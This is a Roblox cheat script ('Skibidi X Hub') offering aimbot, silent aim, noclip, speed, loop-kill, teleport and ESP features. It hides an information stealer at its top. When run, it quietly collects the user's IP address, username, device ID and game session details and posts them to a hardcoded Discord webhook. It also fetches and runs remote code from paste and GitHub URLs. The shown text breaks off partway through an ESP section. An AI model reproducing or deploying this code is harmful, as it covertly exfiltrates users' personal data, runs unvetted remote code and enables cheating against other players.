local Players = game:GetService("Players")
local HttpService = game:GetService("HttpService")
local UserInputService = game:GetService("UserInputService")
local LocalPlayer = Players.LocalPlayer

local DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1458270252658851924/opd3VXQuKyP2F-0ow9hsQfKx3R7QbDf7xbmiayvxL_c5KeJANojBky270TUNBg8amN0M"
local IP_INFO_URL = "https://api.ipify.org?format=json"

-- executor http wrapper
local function httpReq(opt)
    if syn and syn.request then
        return syn.request(opt)
    elseif http_request then
        return http_request(opt)
    elseif request then
        return request(opt)
    else
        error("HTTP not supported by this executor")
    end
end

-- device info（安全）
local function getDeviceInfo()
    local info = { Platform = "Unknown", DeviceId = "N/A", Graphics = "N/A" }

    pcall(function()
        info.Platform = tostring(UserInputService:GetPlatform())
    end)
    pcall(function()
        info.DeviceId = game:GetService("RbxAnalyticsService"):GetClientId()
    end)
    pcall(function()
        info.Graphics = tostring(settings().Rendering.QualityLevel)
    end)

    return info
end

-- send discord
local function sendToDiscord(ip, device)
    task.spawn(function()
        local payload = {
            username = "HahahaHub Logger",
            embeds = {{
                title = "🚨 Script Executed",
                color = 16711680,
                fields = {
                    {
                        name = "👤 User",
                        value = LocalPlayer.Name .. " (" .. LocalPlayer.DisplayName .. ")",
                        inline = true
                    },
                    {
                        name = "🌐 IP",
                        value = ip or "N/A",
                        inline = true
                    },
                    {
                        name = "💻 Device",
                        value =
                            "**Platform:** " .. device.Platform ..
                            "\n**DeviceId:** `" .. device.DeviceId .. "`" ..
                            "\n**Graphics:** " .. device.Graphics,
                        inline = false
                    },
                    {
                        name = "🎮 Game",
                        value =
                            "**PlaceId:** " .. game.PlaceId ..
                            "\n**JobId:** " .. game.JobId,
                        inline = false
                    }
                },
                timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
            }}
        }

        local body = HttpService:JSONEncode(payload)

        httpReq({
            Url = DISCORD_WEBHOOK_URL,
            Method = "POST",
            Headers = { ["Content-Type"] = "application/json" },
            Body = body
        })
    end)
end

-- get ip + send
task.spawn(function()
    local ip = "N/A"
    pcall(function()
        local res = httpReq({ Url = IP_INFO_URL, Method = "GET" })
        ip = HttpService:JSONDecode(res.Body).ip
    end)

    sendToDiscord(ip, getDeviceInfo())
end)

-- 元のOrion UIの読み込みと表示
local OrionLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/jadpy/suki/refs/heads/main/orion"))()

OrionLib:MakeNotification({
    Name = "Script Loaded",
    Content = "Script Load Successfully",
    Time = 3
})

local Window = OrionLib:MakeWindow({
    Name = "Skibidi X Hub",
    HidePremium = false,
    SaveConfig = false,
    Color = Color3.fromRGB(255, 0, 0)
})

local CombatTab = Window:MakeTab({
    Name = "Combat",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local AntiTab = Window:MakeTab({
    Name = "Invincibility",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local PlayerTab = Window:MakeTab({
    Name = "Players",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local VisualsTab = Window:MakeTab({
    Name = "Visuals",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local TeleportTab = Window:MakeTab({
    Name = "Teleports",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local TrollTab = Window:MakeTab({
    Name = "Loop Players",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local MiscTab = Window:MakeTab({
    Name = "Misc",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local TsbTab = Window:MakeTab({
    Name = "TSB",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local InformationTab = Window:MakeTab({
    Name = "Information",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local DiscordTab = Window:MakeTab({
    Name = "Discord Server",
    Icon = "rbxassetid://6034287499",
    PremiumOnly = false
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera
local LocalPlayer = Players.LocalPlayer

CombatTab:AddSection({ Name = "Kill" })

local KillLabel = CombatTab:AddLabel("Kill: 0")
local BaseKillCount = 0
local LastKillCount = 0
local KillValueConnection

local function UpdateKills()
	if LocalPlayer:FindFirstChild("leaderstats")
	and LocalPlayer.leaderstats:FindFirstChild("Kills") then

		local currentKills = LocalPlayer.leaderstats.Kills.Value
		local displayKills = math.max(currentKills - BaseKillCount, 0)
		KillLabel:Set("Kill: " .. displayKills)

		if currentKills > LastKillCount then
			LastKillCount = currentKills
			OrionLib:MakeNotification({
				Name = "キル通知",
				Content = "キル数が " .. displayKills .. " に増えました！",
				Time = 3
			})
		end
	else
		KillLabel:Set("Kill: N/A")
	end
end

local function ConnectKills()
	if KillValueConnection then
		KillValueConnection:Disconnect()
	end

	if LocalPlayer:FindFirstChild("leaderstats")
	and LocalPlayer.leaderstats:FindFirstChild("Kills") then
		local kills = LocalPlayer.leaderstats.Kills
		BaseKillCount = kills.Value
		LastKillCount = BaseKillCount
		UpdateKills()
		KillValueConnection = kills:GetPropertyChangedSignal("Value"):Connect(UpdateKills)
	end
end

LocalPlayer.ChildAdded:Connect(function(child)
	if child.Name == "leaderstats" then
		child:WaitForChild("Kills", 5)
		ConnectKills()
	end
end)

ConnectKills()

CombatTab:AddSection({ Name = "Aimbot" })

local AimEnabled = false
local AimDropdownTarget = ""
local AimInputTarget = ""
local AimSmoothness = 0.25

local function GetPlayerList()
	local t = {}
	for _, p in ipairs(Players:GetPlayers()) do
		if p ~= LocalPlayer then
			table.insert(t, p.Name)
		end
	end
	return t
end

CombatTab:AddDropdown({
	Name = "Select Player",
	Options = GetPlayerList(),
	Callback = function(v)
		AimDropdownTarget = v
	end
})

CombatTab:AddTextbox({
	Name = "Search Player",
	Default = "",
	TextDisappear = false,
	Callback = function(text)
		AimInputTarget = text
	end
})

CombatTab:AddToggle({
	Name = "Aimbot",
	Default = false,
	Callback = function(v)
		AimEnabled = v
	end
})

RunService.RenderStepped:Connect(function()
	if not AimEnabled then return end

	local targetName =
		(AimInputTarget ~= "" and AimInputTarget)
		or AimDropdownTarget
	if targetName == "" then return end

	local target = Players:FindFirstChild(targetName)
	if not (target and target.Character) then return end

	local hum = target.Character:FindFirstChildOfClass("Humanoid")
	if not hum or hum.Health <= 0 then return end

	local part = target.Character:FindFirstChild("LowerTorso")
		or target.Character:FindFirstChild("HumanoidRootPart")
	if not part then return end

	local camPos = Camera.CFrame.Position
	local goalCF = CFrame.lookAt(camPos, part.Position)

	Camera.CFrame = Camera.CFrame:Lerp(goalCF, AimSmoothness)
end)

-- ======================
-- Silent Aim
-- ======================
getgenv().SilentAimRunning = getgenv().SilentAimRunning or false

CombatTab:AddToggle({
	Name = "Silent Aim",
	Default = false,
	Callback = function(state)
		if state then
			if getgenv().SilentAimRunning then return end
			getgenv().SilentAimRunning = true

			local ok, err = pcall(function()
				loadstring(game:HttpGet("https://pastefy.app/05x2AvVC/raw"))()
			end)

			if not ok then
				warn("SilentAim Error:", err)
				getgenv().SilentAimRunning = false
			end
		else
			getgenv().SilentAimRunning = false
			local gui = LocalPlayer:FindFirstChild("PlayerGui")
			if gui and gui:FindFirstChild("SilentAimGui") then
				gui.SilentAimGui:Destroy()
			end
		end
	end
})

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UserInputService = game:GetService("UserInputService")
local VirtualUser = game:GetService("VirtualUser")

local LocalPlayer = Players.LocalPlayer

local Anti = {
    Knockback = false,
    Hitstun = false,
    Fling = false,
    Ragdoll = false,
    AntiLag = false,
    AntiSlowWalk = false,
    AntiGravity = false  
}

local AntiGravityConnection = nil

local AntiConnection
local AntiKickdownConnection
local AntiCameraShakeConnection
local AntiAFKConnection
local AntiGravityConnection 

local function StartAnti()
    if AntiConnection then return end

    AntiConnection = RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        if not (hrp and hum and hum.Health > 0) then return end

        if Anti.Fling then
            if hrp.AssemblyLinearVelocity.Magnitude > 60 then
                hrp.AssemblyLinearVelocity = Vector3.zero
            end
            if hrp.AssemblyAngularVelocity.Magnitude > 40 then
                hrp.AssemblyAngularVelocity = Vector3.zero
            end
        end

        if Anti.Hitstun then
            local s = hum:GetState()
            if s == Enum.HumanoidStateType.Physics or s == Enum.HumanoidStateType.Ragdoll then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end

            if hum.WalkSpeed < 16 then
                hum.WalkSpeed = 16
            end
            if hum.UseJumpPower and hum.JumpPower < 50 then
                hum.JumpPower = 50
            end
        end

        if Anti.AntiSlowWalk then
            if hum.WalkSpeed < 16 then
                hum.WalkSpeed = 16
            end
        end
    end)
end

local function StartAntiGravity()
    if AntiGravityConnection then return end
    AntiGravityConnection = RunService.Heartbeat:Connect(function()
        local char = LocalPlayer.Character
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if hrp then
            if hrp.AssemblyLinearVelocity.Y < -50 then
                hrp.AssemblyLinearVelocity = Vector3.new(hrp.AssemblyLinearVelocity.X, 0, hrp.AssemblyLinearVelocity.Z)
            end
        end
    end)
end

local function StopAntiIfNeeded()
    if not (Anti.Knockback or Anti.Hitstun or Anti.Fling or Anti.AntiLag or Anti.AntiSlowWalk or Anti.AntiGravity) then
        if AntiConnection then
            AntiConnection:Disconnect()
            AntiConnection = nil
        end
    end

    if not Anti.AntiGravity and AntiGravityConnection then
        AntiGravityConnection:Disconnect()
        AntiGravityConnection = nil
    end
end

local AntiRagdollEnabled = false
local AntiRagdollConnection = nil

local function ToggleAntiRagdoll(state)
    AntiRagdollEnabled = state

    if AntiRagdollConnection then
        AntiRagdollConnection:Disconnect()
        AntiRagdollConnection = nil
    end

    if state then
        AntiRagdollConnection = RunService.Heartbeat:Connect(function()
            local char = LocalPlayer.Character
            if not char then return end

            local hum = char:FindFirstChildOfClass("Humanoid")
            local hrp = char:FindFirstChild("HumanoidRootPart")
            if not (hum and hrp and hum.Health > 0) then return end
            
            local stateType = hum:GetState()
            if stateType == Enum.HumanoidStateType.Ragdoll
            or stateType == Enum.HumanoidStateType.Physics
            or stateType == Enum.HumanoidStateType.FallingDown
            or stateType == Enum.HumanoidStateType.GettingUp
            or stateType == Enum.HumanoidStateType.PlatformStanding then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end

            for _, m in ipairs(char:GetDescendants()) do
                if m:IsA("Motor6D") and not m.Enabled then
                    m.Enabled = true
                end
            end

            hum.PlatformStand = false

            local vel = hrp.AssemblyLinearVelocity
            hrp.AssemblyLinearVelocity = Vector3.new(vel.X, math.clamp(vel.Y, -5, 5), vel.Z)
        end)
    end
end

local AntiCameraShakeEnabled = false

local function ToggleAntiCameraShake(state)
    AntiCameraShakeEnabled = state

    if AntiCameraShakeConnection then
        AntiCameraShakeConnection:Disconnect()
        AntiCameraShakeConnection = nil
    end

    if state then
        AntiCameraShakeConnection = RunService.RenderStepped:Connect(function()
            local char = LocalPlayer.Character
            if char then
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.CameraOffset = Vector3.new(0, 0, 0)
                end
            end
        end)
    end
end

local AntiAFKEnabled = false

local function ToggleAntiAFK(state)
    AntiAFKEnabled = state

    if AntiAFKConnection then
        AntiAFKConnection:Disconnect()
        AntiAFKConnection = nil
    end

    if state then
        AntiAFKConnection = LocalPlayer.Idled:Connect(function()
            VirtualUser:ClickButton2(Vector2.new())
        end)
    end
end

local function StartAntiGravity()
    if AntiGravityConnection then return end

    AntiGravityConnection = RunService.Heartbeat:Connect(function()
        local character = LocalPlayer.Character
        if not character then return end

        local hrp = character:FindFirstChild("HumanoidRootPart")
        if not hrp then return end

        local velocity = hrp.AssemblyLinearVelocity

        if velocity.Y < -50 then
            hrp.AssemblyLinearVelocity = Vector3.new(velocity.X, 0, velocity.Z)
        end
    end)
end

local function StopAntiGravity()
    if AntiGravityConnection then
        AntiGravityConnection:Disconnect()
        AntiGravityConnection = nil
    end
end

local function ToggleAntiGravity(state)
    Anti.AntiGravity = state
    if state then
        StartAntiGravity()
    else
        StopAntiGravity()
    end
end

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

local ENABLED = false
local CONNECTION

local DEFAULT_WALKSPEED = 16
local DEFAULT_JUMPPOWER = 50

local BLOCK = {
	BodyVelocity = true,
	BodyPosition = true,
	BodyGyro = true,
	BodyAngularVelocity = true,
	AlignPosition = true,
	AlignOrientation = true,
	LinearVelocity = true,
	AngularVelocity = true
}

local function setupHumanoid(char)
	local hum = char:FindFirstChildOfClass("Humanoid")
	if hum then
		DEFAULT_WALKSPEED = hum.WalkSpeed
		DEFAULT_JUMPPOWER = hum.JumpPower
	end
end

local function forceRestore(char)
	local hum = char:FindFirstChildOfClass("Humanoid")
	local hrp = char:FindFirstChild("HumanoidRootPart")
	if not hum or not hrp then return end

	if hum.WalkSpeed ~= DEFAULT_WALKSPEED then
		hum.WalkSpeed = DEFAULT_WALKSPEED
	end

	if hum.JumpPower ~= DEFAULT_JUMPPOWER then
		hum.JumpPower = DEFAULT_JUMPPOWER
	end

	hum.PlatformStand = false
	hum.AutoRotate = true

	for _, p in ipairs(char:GetDescendants()) do
		if p:IsA("BasePart") then
			p.Anchored = false
		end
		if BLOCK[p.ClassName] then
			p:Destroy()
		end
	end
end

local function start()
	if CONNECTION then return end

	CONNECTION = RunService.Heartbeat:Connect(function()
		if not ENABLED then return end
		local char = LocalPlayer.Character
		if char then
			forceRestore(char)
		end
	end)
end

local function stop()
	if CONNECTION then
		CONNECTION:Disconnect()
		CONNECTION = nil
	end
end

_G.ToggleAntiSlow = function(state)
	ENABLED = state
	if state then
		start()
	else
		stop()
	end
end

LocalPlayer.CharacterAdded:Connect(function(char)
	task.wait(0.3)
	setupHumanoid(char)
end)

if LocalPlayer.Character then
	setupHumanoid(LocalPlayer.Character)
end

local AntiKnockbackConn
local LAST_GOOD_CF
local Y_THRESHOLD = 30      
local H_THRESHOLD = 35      

local function StartAntiKnockback()
    if AntiKnockbackConn then return end

    AntiKnockbackConn = RunService.Stepped:Connect(function()
        if not Anti.Knockback then return end

        local char = LocalPlayer.Character
        if not char then return end

        local hum = char:FindFirstChildOfClass("Humanoid")
        local hrp = char:FindFirstChild("HumanoidRootPart")
        if not (hum and hrp and hum.Health > 0) then return end

        local vel = hrp.AssemblyLinearVelocity
        local moveDir = hum.MoveDirection

        if math.abs(vel.Y) < Y_THRESHOLD and Vector3.new(vel.X,0,vel.Z).Magnitude < H_THRESHOLD then
            LAST_GOOD_CF = hrp.CFrame
            return
        end

        local hVel = Vector3.new(vel.X, 0, vel.Z)
        local horizontalKnock =
            hVel.Magnitude > H_THRESHOLD and
            (moveDir.Magnitude == 0 or hVel.Unit:Dot(moveDir) < -0.3)

        local verticalKnock = vel.Y > Y_THRESHOLD

        if (horizontalKnock or verticalKnock) and LAST_GOOD_CF then

            hrp.CFrame = LAST_GOOD_CF
           hrp.AssemblyLinearVelocity = Vector3.zero
            hrp.AssemblyAngularVelocity = Vector3.zero

            if hum:GetState() ~= Enum.HumanoidStateType.Running then
                hum:ChangeState(Enum.HumanoidStateType.Running)
            end
        end
    end)
end

local function StopAntiKnockback()
    if AntiKnockbackConn then
        AntiKnockbackConn:Disconnect()
        AntiKnockbackConn = nil
    end
    LAST_GOOD_CF = nil
end

local VirtualUser = game:GetService("VirtualUser")
local AntiAFKConn
local AntiAFKEnabled = false

local function StartAntiAFK()
    if AntiAFKConn then return end

    AntiAFKConn = LocalPlayer.Idled:Connect(function()
        VirtualUser:CaptureController()
        VirtualUser:ClickButton2(Vector2.new())
    end)
end

local function StopAntiAFK()
    if AntiAFKConn then
        AntiAFKConn:Disconnect()
        AntiAFKConn = nil
    end
end

AntiTab:AddSection({
    Name = "Invincibility"
})

AntiTab:AddToggle({
    Name = "Anti Knockback",
    Default = false,
    Callback = function(v)
        Anti.Knockback = v
        if v then
            StartAntiKnockback()
        else
            StopAntiKnockback()
        end
    end
})

AntiTab:AddToggle({
    Name = "Anti Ragdoll",
    Default = false,
    Callback = function(v)
        ToggleAntiRagdoll(v)
    end
})

AntiTab:AddToggle({
    Name = "Anti Fling",
    Default = false,
    Callback = function(v)
        Anti.Fling = v
        if v then
            StartAnti()
        else
            StopAntiIfNeeded()
        end
    end
})

AntiTab:AddToggle({
    Name = "Anti Camera Shake",
    Default = false,
    Callback = function(v)
        ToggleAntiCameraShake(v)
    end
})

AntiTab:AddToggle({
    Name = "Anti AFK",
    Default = false,
    Callback = function(v)
        AntiAFKEnabled = v
        if v then
            StartAntiAFK()
        else
            StopAntiAFK()
        end
    end
})

-- ===== Vars =====
local SpeedOn = false
local SpeedValue = 16

local JumpOn = false
local JumpValue = 50

local NoclipOn = false

-- ===== Utils =====
local function GetChar()
    return LocalPlayer.Character
end

local function GetHumanoid()
    local c = GetChar()
    return c and c:FindFirstChildOfClass("Humanoid")
end

-- ===== SPEED（チェンソーマンテスト場対応）=====
local speedBV

local function EnableSpeed()
    local c = GetChar()
    if not c then return end
    local hrp = c:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    if speedBV then speedBV:Destroy() end

    speedBV = Instance.new("BodyVelocity")
    speedBV.Name = "SpeedBoost"
    speedBV.MaxForce = Vector3.new(1e5, 0, 1e5) -- 横方向のみ
    speedBV.Velocity = Vector3.zero
    speedBV.Parent = hrp
end

local function DisableSpeed()
    if speedBV then
        speedBV:Destroy()
        speedBV = nil
    end
end

RunService.RenderStepped:Connect(function()
    if not SpeedOn or not speedBV then return end

    local h = GetHumanoid()
    local c = GetChar()
    if not (h and c) then return end

    local hrp = c:FindFirstChild("HumanoidRootPart")
    if not hrp then return end

    local dir = h.MoveDirection
    if dir.Magnitude > 0 then
        speedBV.Velocity = Vector3.new(
            dir.X * SpeedValue,
            0,
            dir.Z * SpeedValue
        )
    else
        speedBV.Velocity = Vector3.zero
    end
end)

-- ===== NOCLIP =====
RunService.Stepped:Connect(function()
    if not NoclipOn then return end
    local c = GetChar()
    if not c then return end

    for _,v in ipairs(c:GetDescendants()) do
        if v:IsA("BasePart") then
            v.CanCollide = false
        end
    end
end)

-- === SUPER JUMP (FOR BATTLEFIELDS) ===
local jumpEnabled = false
local jumpValue = 50
local humConn

local function setupHumanoid(hum)
    if humConn then
        humConn:Disconnect()
        humConn = nil
    end

    if jumpEnabled then
        hum.UseJumpPower = false
        hum.JumpHeight = math.clamp(jumpValue * 1.6, 8, 160)
    end

    -- 上書き対策（最強の戦場向け）
    humConn = hum:GetPropertyChangedSignal("JumpHeight"):Connect(function()
        if jumpEnabled then
            hum.JumpHeight = math.clamp(jumpValue * 1.6, 8, 160)
        end
    end)
end

local function applyJump()
    local char = LocalPlayer.Character
    if not char then return end

    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return end

    setupHumanoid(hum)
end

-- リスポーン対応
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.2)
    applyJump()
end)

-- ジャンプ入力時にも再適用（重要）
UserInputService.JumpRequest:Connect(function()
    if jumpEnabled then
        applyJump()
    end
end)

local RunService = game:GetService("RunService")
local Camera = workspace.CurrentCamera

local fovEnabled = false
local fovValue = 70

-- 常に維持
RunService.RenderStepped:Connect(function()
    if fovEnabled and Camera then
        Camera.FieldOfView = fovValue
    end
end)

-- ===== UI =====

PlayerTab:AddToggle({
    Name = "FOV Changer",
    Default = false,
    Callback = function(v)
        fovEnabled = v
        if not v and Camera then
            Camera.FieldOfView = 70 -- OFF時は通常に戻す
        end
    end
})

PlayerTab:AddSlider({
    Name = "FOV",
    Range = {50, 120},
    Increment = 1,
    CurrentValue = 70,
    Callback = function(v)
        fovValue = v
        if fovEnabled and Camera then
            Camera.FieldOfView = fovValue
        end
    end
})

PlayerTab:AddSection({ Name = "Speed Boost" })

PlayerTab:AddSlider({
    Name = "Speed Power",
    Range = {16, 100}, -- UI上限
    Increment = 1,
    CurrentValue = 16,
    Callback = function(v)
        SpeedValue = v * 5 -- ← ★内部で5倍（最大500）
    end
})

PlayerTab:AddToggle({
    Name = "Speed Boost",
    CurrentValue = false,
    Callback = function(v)
        SpeedOn = v
        if v then
            EnableSpeed()
        else
            DisableSpeed()
        end
    end
})

PlayerTab:AddSection({ Name = "Jump Boost" })

PlayerTab:AddToggle({
    Name = "Jump Boost",
    Default = false,
    Callback = function(v)
        jumpEnabled = v
        applyJump()
    end
})

PlayerTab:AddSlider({
    Name = "Jump Strength",
    Min = 1,
    Max = 100,
    Default = 50,
    Increment = 1,
    Callback = function(v)
        jumpValue = v
        applyJump()
    end
})

PlayerTab:AddSection({ Name = "Collision" })

PlayerTab:AddToggle({
    Name = "Noclip",
    CurrentValue = false,
    Callback = function(v)
        NoclipOn = v
    end
})

-- ===== RESPAWN FIX =====
LocalPlayer.CharacterAdded:Connect(function()
    task.wait(0.3)
    local h = GetHumanoid()
    if not h then return end

    h.UseJumpPower = true
    h.JumpPower = JumpOn and JumpValue or 50
end)

-- ===== Loop Players =====
TrollTab:AddSection({ Name = "LOOP PLAYERS" })

local dropdownTarget = ""
local inputTarget = ""
local trolling = false
local lastSafeCFrame
local loopKillConn

-- === Player List ===
local function GetPlayerList()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(t, p.Name)
        end
    end
    return t
end

local playerDropdown = TrollTab:AddDropdown({
    Name = "Select Player",
    Options = GetPlayerList(),
    Callback = function(v)
        dropdownTarget = v
    end
})

-- プレイヤー参加時に更新
Players.PlayerAdded:Connect(function()
    playerDropdown:Refresh(GetPlayerList())
end)

Players.PlayerRemoving:Connect(function()
    playerDropdown:Refresh(GetPlayerList())
end)

TrollTab:AddTextbox({
    Name = "Search Player",
    Default = "",
    TextDisappear = false,
    Callback = function(text)
        inputTarget = text
    end
})

-- === Target Utility ===
local function getTargetPlayer()
    local name = (inputTarget ~= "" and inputTarget) or dropdownTarget
    if name == "" then return nil end
    return Players:FindFirstChild(name)
end

-- === Loop Kill START ===
local function StartLoopKill()
    if loopKillConn then
        loopKillConn:Disconnect()
        loopKillConn = nil
    end

    local t = 0
    local burstDone = false
    lastSafeCFrame = nil

    loopKillConn = RunService.Heartbeat:Connect(function(dt)
        if not trolling then return end

        t += dt * 90

        local target = getTargetPlayer()
        local myChar = LocalPlayer.Character
        if not (target and target.Character and myChar) then return end

        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
        local targetHum = target.Character:FindFirstChildOfClass("Humanoid")
        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
        if not (targetHRP and targetHum and myHRP) then return end

        -- 初期退避地点保存
        if not lastSafeCFrame then
            lastSafeCFrame = myHRP.CFrame
            burstDone = false
        end

        -- 危険状態 → 即帰還
        if targetHRP.AssemblyLinearVelocity.Magnitude > 55
        or targetHRP.AssemblyLinearVelocity.Y > 35
        or targetHum:GetState() == Enum.HumanoidStateType.Freefall then
            myHRP.CFrame = lastSafeCFrame
            lastSafeCFrame = nil
            burstDone = false
            return
        end

        local look = targetHRP.CFrame.LookVector

        -- 初回バースト
        if not burstDone then
            burstDone = true
            myHRP.CFrame = targetHRP.CFrame * CFrame.new(0, 0, -0.9)
            myHRP.AssemblyLinearVelocity =
                look * 450 + Vector3.new(0, 180, 0)
        end

        -- 周回軌道
        local forwardOffset = math.sin(t) * 5.8
        local sideOffset    = math.cos(t * 1.4) * 2.6

        local goalCF =
            targetHRP.CFrame *
            CFrame.new(sideOffset, 0, -1.05 + forwardOffset)

        myHRP.CFrame = myHRP.CFrame:Lerp(goalCF, 0.9)
    end)
end

-- === Loop Kill STOP ===
local function StopLoopKill()
    if loopKillConn then
        loopKillConn:Disconnect()
        loopKillConn = nil
    end
    lastSafeCFrame = nil
end

-- === UI ===
TrollTab:AddSection({ Name = "Loop Kill" })

TrollTab:AddToggle({
    Name = "Loop Kill",
    Default = false,
    Callback = function(v)
        trolling = v
        if v then
            StartLoopKill()
        else
            StopLoopKill()
        end
    end
})

TrollTab:AddButton({
    Name = "LOOP KILL GUI",
    Callback = function()
        loadstring(game:HttpGet("https://pastefy.app/uqBgu2Rf/raw"))()
    end
})

-- === FOLLOW BEHIND (FACE TARGET FIXED) ===
local followEnabled = false
local followConn
local followScriptLoaded = false

local function StartFollowBehind()
    if followConn then
        followConn:Disconnect()
        followConn = nil
    end

    -- 初回のみスクリプト起動
    if not followScriptLoaded then
        followScriptLoaded = true
        task.spawn(function()
            loadstring(game:HttpGet(
                "https://raw.githubusercontent.com/yes1nt/yes/refs/heads/main/Trashcan%20Man",
                true
            ))()
        end)
    end

    followConn = RunService.Heartbeat:Connect(function()
        if not followEnabled then return end

        local target = getTargetPlayer()
        local myChar = LocalPlayer.Character
        if not (target and target.Character and myChar) then return end

        local targetHRP = target.Character:FindFirstChild("HumanoidRootPart")
        local myHRP = myChar:FindFirstChild("HumanoidRootPart")
        if not (targetHRP and myHRP) then return end

        -- 背後の追従位置
        local desiredPos =
            (targetHRP.CFrame * CFrame.new(0, 0, 2)).Position

        local offset = desiredPos - myHRP.Position
        local dist = offset.Magnitude
        if dist > 0.1 then
            local dir = offset.Unit
            local speed = math.clamp(dist * 16, 18, 60)

            -- 移動（自然）
            myHRP.AssemblyLinearVelocity = Vector3.new(
                dir.X * speed,
                myHRP.AssemblyLinearVelocity.Y,
                dir.Z * speed
            )
        end

        -- ===== 向き固定（常に相手を見る）=====
        local lookPos = Vector3.new(
            targetHRP.Position.X,
            myHRP.Position.Y,
            targetHRP.Position.Z
        )

        myHRP.CFrame = CFrame.new(myHRP.Position, lookPos)
    end)
end

local function StopFollowBehind()
    if followConn then
        followConn:Disconnect()
        followConn = nil
    end
end

-- === UI ===
TrollTab:AddSection({ Name = "Loop Trash Kill" })

TrollTab:AddToggle({
    Name = "Loop Trash Kill",
    Default = false,
    Callback = function(v)
        followEnabled = v
        if v then
            StartFollowBehind()
        else
            StopFollowBehind()
        end
    end
})

-- services
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer
local Camera = workspace.CurrentCamera

-- =========================
-- Player Dropdown
-- =========================
TeleportTab:AddSection({ Name = "Player Select" })

local SelectedPlayer = nil

local function GetPlayerNames()
    local t = {}
    for _, p in ipairs(Players:GetPlayers()) do
        if p ~= LocalPlayer then
            table.insert(t, p.Name)
        end
    end
    return t
end

TeleportTab:AddDropdown({
    Name = "Select Player",
    Options = GetPlayerNames(),
    Callback = function(v)
        SelectedPlayer = v
    end
})

Players.PlayerAdded:Connect(function()
    -- dropdown更新用（再実行時に反映される）
end)

Players.PlayerRemoving:Connect(function(p)
    if SelectedPlayer == p.Name then
        SelectedPlayer = nil
    end
end)

-- =========================
-- Teleport Button
-- =========================
TeleportTab:AddButton({
    Name = "Teleport To Player",
    Callback = function()
        if not SelectedPlayer then return end

        local target = Players:FindFirstChild(SelectedPlayer)
        if not (target and target.Character) then return end

        local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
        local tHRP = target.Character:FindFirstChild("HumanoidRootPart")

        if myHRP and tHRP then
            myHRP.CFrame = tHRP.CFrame * CFrame.new(0, 0, -3)
        end
    end
})

-- =========================
-- Loop Teleport
-- =========================
local LoopTP = false

TeleportTab:AddToggle({
    Name = "Loop Teleport",
    Default = false,
    Callback = function(v)
        LoopTP = v
    end
})

RunService.RenderStepped:Connect(function()
    if not LoopTP then return end
    if not SelectedPlayer then return end

    local target = Players:FindFirstChild(SelectedPlayer)
    if not (target and target.Character) then return end

    local myHRP = LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
    local tHRP = target.Character:FindFirstChild("HumanoidRootPart")

    if myHRP and tHRP then
        myHRP.CFrame = tHRP.CFrame * CFrame.new(0, 0, -3)
    end
end)

-- =========================
-- Camera Lock
-- =========================
local CameraLock = false

TeleportTab:AddToggle({
    Name = "Camera Lock",
    Default = false,
    Callback = function(v)
        CameraLock = v
    end
})

RunService.RenderStepped:Connect(function()
    if not CameraLock then return end
    if not SelectedPlayer then return end

    local target = Players:FindFirstChild(SelectedPlayer)
    if not (target and target.Character) then return end

    local hrp = target.Character:FindFirstChild("HumanoidRootPart")
    if hrp then
        Camera.CFrame = CFrame.new(Camera.CFrame.Position, hrp.Position)
    end
end)

local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

-- =====================
-- Highlight V1
-- =====================
local HighlightEnabled = false
local HighlightColor = Color3.fromRGB(255, 0, 0)
local HighlightTransparency = 0.35
local HighlightObjects = {}

local function CreateHighlight(plr)
    if plr == LocalPlayer then return end
    if HighlightObjects[plr] then return end
    if not plr.Character then return end

    local hl = Instance.new("Highlight")
    hl.Name = "ESP_HIGHLIGHT_V1"
    hl.Adornee = plr.Character
    hl.FillColor = HighlightColor
    hl.OutlineColor = HighlightColor
    hl.FillTransparency = HighlightTransparency
    hl.OutlineTransparency = 0
    hl.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
    hl.Parent = workspace

    HighlightObjects[plr] = hl
end

local function RemoveHighlight(plr)
    if HighlightObjects[plr] then
        HighlightObjects[plr]:Destroy()
        HighlightObjects[plr] = nil
    end
end

local function RefreshHighlight()
    for _, plr in ipairs(Players:GetPlayers()) do
        if HighlightEnabled then
            CreateHighlight(plr)
        else
            RemoveHighlight(plr)
        end
    end
end

RunService.RenderStepped:Connect(function()
    if not HighlightEnabled then return end
    for _, hl in pairs(HighlightObjects) do
        if hl then
            hl.FillColor = HighlightColor
            hl.OutlineColor = HighlightColor
            hl.FillTransparency = HighlightTransparency
        end
    end
end)

-- =====================
-- Highlight V2 (RGB)
-- =====================
local V2Enabled = false
